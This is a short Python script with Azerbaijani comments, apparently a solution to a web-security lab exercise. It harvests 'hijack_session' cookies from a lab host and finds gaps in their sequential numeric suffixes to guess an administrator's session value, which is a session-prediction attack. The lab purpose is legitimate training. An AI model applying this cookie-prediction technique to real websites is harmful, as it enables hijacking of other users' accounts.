import requests

# BU SADƏCƏ TƏHSİL ÜÇÜN NÜMUNƏDİR.
url = "http://web0x01.hbtn/a1/hijack_session/"
collected_numbers = []

# Nümunə toplamaq üçün bir neçə dəfə sorğu göndəririk
for i in range(10):
    response = requests.get(url)
    
    # Fərz edək ki, server bizə 'hijack_session' adlı cookie qaytarır
    if 'hijack_session' in response.cookies:
        cookie_val = response.cookies['hijack_session']
        
        # Cookie-nin son hissəsini (rəqəmləri) ayırmaq
        parts = cookie_val.split('-')
        if len(parts) > 0 and parts[-1].isdigit():
            collected_numbers.append(int(parts[-1]))

# Toplanan rəqəmləri sıralayırıq
collected_numbers.sort()
print(collected_numbers)
# Ardıcıllıqda əskik olan (missing) rəqəmi tapmaq məntiqi
for i in range(len(collected_numbers) - 1):
    # Əgər iki ardıcıl rəqəm arasındakı fərq 1-dən böyükdürsə, arada kimsə var
    if collected_numbers[i + 1] - collected_numbers[i] > 1:
        print(f"Tapılan boşluq {collected_numbers[i]} və {collected_numbers[i + 1]} arasındadır.")
        # Çatışmayan rəqəmi hesablayırıq
        missing_end = collected_numbers[i] + 1
        print(f"Ehtimal edilən admin sonluğu: {missing_end}")

